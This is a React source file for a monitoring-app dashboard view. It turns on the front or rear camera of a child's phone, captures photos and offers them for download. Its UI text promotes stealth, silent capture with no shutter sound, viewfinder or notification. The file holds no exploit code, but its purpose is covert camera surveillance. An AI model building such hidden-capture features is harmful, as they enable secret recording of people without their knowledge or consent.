import React, { useState } from 'react';
import { CameraPosition } from '../types';
import { 
  Camera, 
  FlipHorizontal, 
  Video, 
  VideoOff, 
  EyeOff, 
  ZapOff, 
  Image as ImageIcon, 
  Clock, 
  ShieldCheck, 
  Download,
  Eye,
  RefreshCw,
  Sparkles,
  Smartphone
} from 'lucide-react';

interface CameraStreamViewProps {
  activeCamera: CameraPosition;
  isCameraStreaming: boolean;
  latestCameraSnapshot: string | null;
  cameraSnapshotTimestamp?: string;
  cameraSnapshots?: Array<{ id: string; url: string; timestamp: string; camera: CameraPosition }>;
  onSetCamera: (camera: CameraPosition) => void;
  onCaptureSnapshot: (camera: CameraPosition) => void;
  childName: string;
}

export const CameraStreamView: React.FC<CameraStreamViewProps> = ({
  activeCamera,
  isCameraStreaming,
  latestCameraSnapshot,
  cameraSnapshotTimestamp,
  cameraSnapshots = [],
  onSetCamera,
  onCaptureSnapshot,
  childName
}) => {
  const [selectedCam, setSelectedCam] = useState<'front' | 'back'>('front');
  const [inspectPhoto, setInspectPhoto] = useState<string | null>(null);

  const handleToggleCam = (position: 'front' | 'back') => {
    setSelectedCam(position);
    if (activeCamera === position) {
      onSetCamera('off');
    } else {
      onSetCamera(position);
    }
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
      
      {/* Left 7 cols: Live Dual Camera Stream Window */}
      <div className="lg:col-span-7 bg-white border border-slate-200 rounded-2xl overflow-hidden shadow-xs flex flex-col">
        
        {/* Stream Header */}
        <div className="bg-slate-50 px-4 py-3.5 border-b border-slate-200 flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-purple-100 text-purple-700 border border-purple-200 flex items-center justify-center">
              <Camera className="w-4 h-4" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-slate-900 flex items-center gap-2">
                Stealth Dual Camera Stream
                <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-purple-50 text-purple-700 border border-purple-200 font-bold">
                  {activeCamera === 'off' ? 'Camera Idle' : `${activeCamera.toUpperCase()} Active`}
                </span>
              </h2>
              <p className="text-xs text-slate-500">
                Front & Rear Live Lens Feed from {childName}'s Device
              </p>
            </div>
          </div>

          {/* Camera Selector Buttons */}
          <div className="flex items-center gap-2">
            <button
              onClick={() => handleToggleCam('front')}
              className={`px-3 py-1.5 text-xs font-bold rounded-xl border flex items-center gap-1.5 transition-all shadow-2xs ${
                activeCamera === 'front'
                  ? 'bg-purple-600 text-white border-purple-700 shadow-purple-600/30'
                  : 'bg-white text-slate-700 border-slate-300 hover:bg-slate-50'
              }`}
            >
              <Camera className="w-3.5 h-3.5" />
              Front Lens
            </button>
            <button
              onClick={() => handleToggleCam('back')}
              className={`px-3 py-1.5 text-xs font-bold rounded-xl border flex items-center gap-1.5 transition-all shadow-2xs ${
                activeCamera === 'back'
                  ? 'bg-purple-600 text-white border-purple-700 shadow-purple-600/30'
                  : 'bg-white text-slate-700 border-slate-300 hover:bg-slate-50'
              }`}
            >
              <Camera className="w-3.5 h-3.5" />
              Rear Lens
            </button>
          </div>
        </div>

        {/* Live Camera Feed Preview Box */}
        <div className="p-6 bg-slate-950 flex flex-col items-center justify-center min-h-[380px] relative">
          
          {activeCamera !== 'off' ? (
            <div className="w-full max-w-lg aspect-video bg-black rounded-2xl overflow-hidden border-2 border-purple-500/50 shadow-2xl relative flex items-center justify-center">
              
              {/* If we have a live snapshot or real camera image */}
              {latestCameraSnapshot ? (
                <img 
                  src={latestCameraSnapshot} 
                  alt="Live Camera Snapshot" 
                  className="w-full h-full object-cover"
                />
              ) : (
                <div className="text-center space-y-3 z-20 p-6 text-white">
                  <div className="w-14 h-14 rounded-full bg-purple-500/20 text-purple-400 border border-purple-500/40 flex items-center justify-center mx-auto animate-pulse">
                    <Video className="w-7 h-7" />
                  </div>
                  <div>
                    <h3 className="font-bold text-white text-sm sm:text-base">
                      {activeCamera === 'front' ? 'Front Self-Facing Camera' : 'Rear Main Camera'} Stream Ready
                    </h3>
                    <p className="text-xs text-purple-300 font-mono mt-1">
                      Grant camera permission on Child Mode to transmit real hardware photos.
                    </p>
                  </div>
                </div>
              )}

              {/* Live Badge */}
              <div className="absolute top-3 left-3 z-20 flex items-center gap-2 bg-black/70 backdrop-blur-md px-3 py-1 rounded-full border border-white/20 text-xs text-white">
                <span className="w-2 h-2 rounded-full bg-red-500 animate-ping" />
                <span className="font-bold text-[11px]">LIVE • {activeCamera.toUpperCase()} CAM</span>
              </div>

              {/* Quick Snapshot Action Button */}
              <div className="absolute bottom-3 inset-x-0 flex justify-center z-20">
                <button
                  onClick={() => onCaptureSnapshot(activeCamera)}
                  className="px-4 py-2 bg-orange-600 hover:bg-orange-500 text-white text-xs font-bold rounded-xl shadow-lg shadow-orange-950/60 inline-flex items-center gap-2 transition-all"
                >
                  <Camera className="w-4 h-4" />
                  Capture High-Res Photo
                </button>
              </div>

            </div>
          ) : (
            <div className="text-center space-y-3 max-w-sm p-8 bg-slate-900/80 rounded-2xl border border-slate-800 text-white">
              <div className="w-12 h-12 rounded-2xl bg-slate-800 text-slate-400 flex items-center justify-center mx-auto">
                <VideoOff className="w-6 h-6" />
              </div>
              <h3 className="text-sm font-bold text-slate-200">Camera Stream Idle</h3>
              <p className="text-xs text-slate-400 leading-relaxed">
                Click <b>Front Lens</b> or <b>Rear Lens</b> above to initiate silent camera preview from {childName}'s phone.
              </p>
            </div>
          )}

        </div>

      </div>

      {/* Right 5 cols: Stealth Guarantees & Real Snapshot Gallery */}
      <div className="lg:col-span-5 space-y-6">
        
        {/* Stealth Guarantee Card */}
        <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-3">
          <div className="flex items-center gap-2 border-b border-slate-100 pb-2.5">
            <EyeOff className="w-4 h-4 text-purple-600" />
            <h3 className="font-bold text-sm text-slate-900">Silent Operation Protection</h3>
          </div>

          <div className="space-y-2 text-xs text-slate-600">
            <div className="p-3 bg-slate-50 rounded-xl border border-slate-200 flex items-start gap-2.5">
              <ZapOff className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
              <div>
                <b className="text-slate-800 block text-xs mb-0.5">Zero Shutter Sound & Screen Flashes</b>
                <p className="text-slate-500 leading-relaxed text-[11px]">
                  Silent background capture operates without displaying viewfinders, notification popups, or camera shutter sounds.
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Latest Snapshot Card & Photo Gallery */}
        <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-3">
          <div className="flex items-center justify-between border-b border-slate-100 pb-2.5">
            <div className="flex items-center gap-2">
              <ImageIcon className="w-4 h-4 text-orange-500" />
              <h3 className="font-bold text-sm text-slate-900">Latest Captured Photos</h3>
            </div>
            {cameraSnapshotTimestamp && (
              <span className="text-[10px] text-slate-400 font-mono">
                {new Date(cameraSnapshotTimestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
              </span>
            )}
          </div>

          {latestCameraSnapshot ? (
            <div className="space-y-3">
              <div className="relative rounded-xl overflow-hidden border border-slate-200 group bg-slate-950 aspect-video flex items-center justify-center">
                <img
                  src={latestCameraSnapshot}
                  alt="Latest Snapshot"
                  className="w-full h-full object-contain"
                />
                <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center gap-2">
                  <button
                    onClick={() => setInspectPhoto(latestCameraSnapshot)}
                    className="px-3 py-1.5 bg-white text-slate-900 text-xs font-bold rounded-lg shadow-md flex items-center gap-1"
                  >
                    <Eye className="w-3.5 h-3.5" />
                    Enlarge
                  </button>
                  <a
                    href={latestCameraSnapshot}
                    download={`snapshot_${Date.now()}.jpg`}
                    className="px-3 py-1.5 bg-orange-600 text-white text-xs font-bold rounded-lg shadow-md flex items-center gap-1"
                  >
                    <Download className="w-3.5 h-3.5" />
                    Save
                  </a>
                </div>
              </div>

              {cameraSnapshots.length > 1 && (
                <div className="grid grid-cols-3 gap-2 pt-1">
                  {cameraSnapshots.slice(1, 4).map((snap) => (
                    <div
                      key={snap.id}
                      onClick={() => setInspectPhoto(snap.url)}
                      className="cursor-pointer aspect-video rounded-lg overflow-hidden border border-slate-200 hover:border-orange-500 transition-all bg-slate-900"
                    >
                      <img src={snap.url} alt="Gallery item" className="w-full h-full object-cover" />
                    </div>
                  ))}
                </div>
              )}
            </div>
          ) : (
            <div className="text-center py-6 text-xs text-slate-400 space-y-2 bg-slate-50 rounded-xl border border-slate-200">
              <Camera className="w-8 h-8 mx-auto text-slate-300" />
              <p>No camera photos captured yet.</p>
              <button
                onClick={() => onCaptureSnapshot('front')}
                className="text-xs text-orange-600 hover:underline font-bold"
              >
                Trigger Front Photo Capture
              </button>
            </div>
          )}
        </div>

      </div>

      {/* Inspect Photo Modal */}
      {inspectPhoto && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-xs flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-700 rounded-3xl max-w-2xl w-full p-4 overflow-hidden shadow-2xl space-y-3">
            <div className="flex items-center justify-between text-white border-b border-slate-800 pb-2">
              <span className="font-bold text-sm flex items-center gap-2">
                <Camera className="w-4 h-4 text-orange-400" /> High-Resolution Photo Preview
              </span>
              <button onClick={() => setInspectPhoto(null)} className="text-slate-400 hover:text-white text-sm font-bold">
                ✕ Close
              </button>
            </div>
            <div className="max-h-[70vh] overflow-hidden rounded-xl flex items-center justify-center bg-black">
              <img src={inspectPhoto} alt="Full view" className="max-h-[65vh] w-auto object-contain" />
            </div>
            <div className="flex justify-end pt-2">
              <a
                href={inspectPhoto}
                download={`child_camera_${Date.now()}.jpg`}
                className="px-4 py-2 bg-orange-600 hover:bg-orange-500 text-white text-xs font-bold rounded-xl flex items-center gap-1.5"
              >
                <Download className="w-4 h-4" /> Download Original Photo
              </a>
            </div>
          </div>
        </div>
      )}

    </div>
  );
};
